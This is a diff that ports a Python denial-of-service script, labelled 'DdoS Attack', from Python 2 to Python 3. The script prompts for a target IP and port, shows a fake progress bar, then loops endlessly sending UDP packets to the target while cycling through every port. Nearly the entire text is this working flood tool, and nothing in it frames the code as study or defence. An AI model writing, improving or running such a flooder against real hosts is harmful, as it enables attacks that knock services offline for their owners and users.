@@ -28,27 +28,27 @@ print("""\033[35m
   | |_| | |_| | (_) |__) |  / ___ \ |_| || (_| | (__|   < 
   |____/|____/ \___/____/  /_/   \_\__|\__\__,_|\___|_|\_\ © """)
 print()
-ip = raw_input(" IP Target : => ")
+ip = input(" IP Target : => ")
 port = input(" Port       : => ")
 os.system("clear")
 print("\033[93m")
 os.system("figlet DdoS Attack")
 print ("\033[92m")
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
+print( "[                    ] 0% ")
 time.sleep(3)
+print( "[=====               ] 25%")
+time.sleep(3)
+print( "[==========          ] 50%")
+time.sleep(3)
+print( "[================    ] 75%")
+time.sleep(3)
+print( "[====================] 100%")
+time.sleep(2)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print( "Sent %s packet to %s throught port:%s"%(sent,ip,port))
      if port == 65534:
        port = 1
